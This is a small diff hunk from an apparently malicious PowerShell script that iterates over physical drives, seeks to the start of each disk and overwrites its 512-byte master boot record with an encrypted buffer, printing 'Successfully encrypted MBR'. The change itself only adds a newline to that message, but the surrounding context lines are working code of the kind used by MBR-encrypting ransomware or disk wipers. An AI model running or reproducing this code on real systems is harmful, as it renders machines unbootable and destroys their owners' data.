@@ -33,7 +33,7 @@ foreach ($drive in $drives) {
         $fs.Seek(0, [IO.SeekOrigin]::Begin) | Out-Null
         $fs.Write($mbr, 0, 512)
 
-        Write-Host "Successfully encrypted MBR on $diskPath"
+        Write-Host "`nSuccessfully encrypted MBR on $diskPath"
 
     } catch {
         throw "Failed to process $diskPath - $_"
